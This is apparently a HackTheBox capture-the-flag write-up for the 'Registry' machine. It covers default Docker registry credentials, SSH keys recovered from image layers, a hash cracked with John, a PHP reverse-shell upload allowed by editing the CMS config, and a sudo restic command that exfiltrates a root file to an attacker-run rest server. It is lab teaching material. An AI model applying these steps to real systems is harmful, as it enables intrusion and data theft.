---
title: "Registry - HackTheBox"
date: 2020-04-04T18:00:00+01:00
tags: [docker, exfiltration, reverse shell, restic]
---

Let's start with the usual port scan:
```
$ nmap -A -T4 10.10.10.159
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-10 08:04 PST
Nmap scan report for 10.10.10.159
Host is up (0.057s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The web responds with the default nginx web page:
![](/images/hackthebox/registry/web.png)

Let's run a simple discovery against it using [ffuf](https://github.com/ffuf/ffuf):
```
$ ffuf -c -r -fc 403 -w raft-medium-files.txt -u http://10.10.10.159/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.159/FUZZ
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

index.html              [Status: 200, Size: 612, Words: 79, Lines: 26]
.                       [Status: 200, Size: 612, Words: 79, Lines: 26]
backup.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
```

```
$ ffuf -c -r -fc 403 -w raft-medium-directories.txt -u http://10.10.10.159/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.159/FUZZ
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 403
________________________________________________

install                 [Status: 200, Size: 1010, Words: 5, Lines: 3]
```

The `backup.php` file size is 0, so there's no content, but the `install` file
looks interesting. Let's visit it:
![](/images/hackthebox/registry/install.png)

Looks like a binary file, let's check it's type after saving it:
```
$ file install
install: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original size modulo 2^32 167772200 gzip compressed data, reserved method, has CRC, was "", from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 167772200
```

Let's extract it:
```
$ tar -zxf install

gzip: stdin: unexpected end of file
tar: Child returned status 1
tar: Error is not recoverable: exiting now
```

And let's check what's in it:
```
$ ls
ca.crt  install  readme.md
```

Here is `ca.crt`:

```
-----BEGIN CERTIFICATE-----
MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER
MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5
T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5
zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc
r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1
zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI
qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX
8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV
HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3
LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ
UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N
7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr
CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9
QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B
-----END CERTIFICATE-----
```

And `readme.md`:
```
# Private Docker Registry

- https://docs.docker.com/registry/deploying/
- https://docs.docker.com/engine/security/certificates/
```

Another quote to `registry`, let's run a discovery on the `docker.registry.htb`
domain found in the port scan:

```
$ ffuf -c -r -fc 403 -w lists/raft-small-directories.txt -u https://docker.registry.htb/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : https://docker.registry.htb/FUZZ
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

v2                      [Status: 401, Size: 87, Words: 2, Lines: 2]
```

`/v2` is an API endpoint for a Docker registry, which is like a repository for
Docker images, so after reading the documentation, let's login to it.  Trying
some random default credentials, we can login with `admin:admin`:

```
$ docker login docker.registry.htb
Username: admin
Password:
WARNING! Your password will be stored unencrypted in /home/vagrant/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
```

We can list the available images with a simple http request:
```
$ curl https://admin:admin@docker.registry.htb/v2/_catalog
{"repositories":["bolt-image"]}
```

Let's use [docker_fetch](https://github.com/NotSoSecure/docker_fetch) to fetch all the image layers:
```
$ ./docker_image_fetch.py -u https://admin:admin@docker.registry.htb

[+] List of Repositories:
bolt-image

Which repo would you like to download?:  bolt-image

[+] Available Tags:
latest

Which tag would you like to download?:  latest

Give a directory name:  bolt-image
Now sit back and relax. I will download all the blobs for you in bolt-image directory.
Open the directory, unzip all the files and explore like a Boss.

[+] Downloading Blob: 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b
[+] Downloading Blob: 3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee
[+] Downloading Blob: 02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c
[+] Downloading Blob: c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7
[+] Downloading Blob: 2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791
[+] Downloading Blob: a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
[+] Downloading Blob: f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0
[+] Downloading Blob: d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a
[+] Downloading Blob: 8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797
[+] Downloading Blob: f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff
```

After inspecting the layers, one of the most interesting ones turns out to be
`302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar.gz`, which
contains this file:
```
$ cat etc/profile.d/01-ssh.sh
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

It basically adds an encrypted ssh key to the agent upon login. After inspecting
the rest of the layers, another interesting one turns out to be
`2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791.tar.gz`, which
contains a en encrypted ssh key and a `passwd` file:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
bolt:x:1000:1000::/home/bolt:/bin/sh
```

Let's try to login into the machine using the ssh key that we found as `bolt`
user:

```
bolt@bolt:~$ wc -c user.txt
33 user.txt
```

And we're in!

# Privilege escalation
The first thing that I did was to check the `backup.php` file that we've
previously found while running our discovery:
```
bolt@bolt:/var/www/html$ cat backup.php
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```

[Restic](https://restic.net/) is a software used for backups, and every time
that `backup.php` gets visited, a backup of the `bolt` directory will ben done
on `backup.registry.htb`

While inspecting the web server root directory, we can see the folder named
`bolt` (the one from the backup), which we have not previously found while
fuzzing:
```
bolt@bolt:/var/www/html$ ls
backup.php  bolt  index.html  index.nginx-debian.html  install
```

Here is the web page:
![](/images/hackthebox/registry/bolt.png)

Also, under `/var/www/html/bolt/app/database/` there's `bolt.db`, which contains
the hash of the admin user:
```
sqlite> select * from bolt_users;
1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-17 14:34:52|10.10.14.2|Admin|["files://shell.php"]|1||||0||["root","everyone"]
```

Simply running John The Ripper against it, we can find that the password is
`strawberry`.

Now, the default location of the admin panel of the Bolt web app is under
`/bolt`, but given the the app was already in a folder named `bolt`, we have to
visit `http://10.10.10.159/bolt/bolt/`:
![](/images/hackthebox/registry/login.png)

This is a simple CMS system.
One appealing thing is the upload functionality, so the first thing that came to
my mind is to upload a PHP reverse shell:
![](/images/hackthebox/registry/upload.png)

But if we try to upload one, we can see that `php` is not an allowed extension:
![](/images/hackthebox/registry/upload-error.png)

It would be nice if we could change that setting, right? Well, luckily we can,
under Configuration -> Main configuration, we can modify the `config.yml` file:
![](/images/hackthebox/registry/config.png)

Let's add the `php` extension to the `allowed_file_type` option, save, and
now we can upload PHP files.

At first, I tried to get a reverse shell to my machine on `10.10.14.81`, but
after a bit of trial and error (the fact that the `config.yml` file gets
resetted by a cron job every minute did not help), I managed to get one using
the `bolt` ssh session on the remote matchine as `www-data` user.

The first thing that I checked is which commands we can run with sudo without a
password with `sudo -l`:
```
User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```

Hence the previously found command in `backup.php`. Exploiting this allows us to
backup any file on the machine, since we are running the command with sudo.

We will need a rest server, which we can download
[here](https://github.com/restic/rest-server`) and after compiling it, let's
copy the executable on the remote machine with `scp rest-server
bolt@10.10.10.159:/tmp`

Let's initialize a new Restic repository, I used `p4ssw0rd` as password:
```
bolt@bolt:/tmp$ restic init -d data
enter a password for new repository:
enter a password again:
created restic repository e22c3e433b at data

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

Now let't run the rest server:
```
bolt@bolt:/tmp$ ./rest-server
```

And let's exfiltrate the root flag:
```
www-data@bolt:/tmp$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000/data /root/root.txt
enter password for repository: p4ssw0rd

password is correct
scan [/root/root.txt]
scanned 0 directories, 1 files in 0:00
[0:00] 100.00%  33B / 33B  1 / 1 items  0 errors   ETA 0:00
duration 0:00
snapshot a082fd1b saved
```

And now we can recover the file:
```
bolt@bolt:/tmp$ restic -r rest:http://127.0.0.1:8000/repo restore e22c3e433b --target /tmp/restore/
```

And here's our flag!
```
bolt@bolt:/tmp/restore$ wc -c root.txt
33 root.txt
```

Another thing that we could have done is to exfiltrate the root ssh key in order
to gain a shell and not only exfiltrate files.

Thanks for reading!
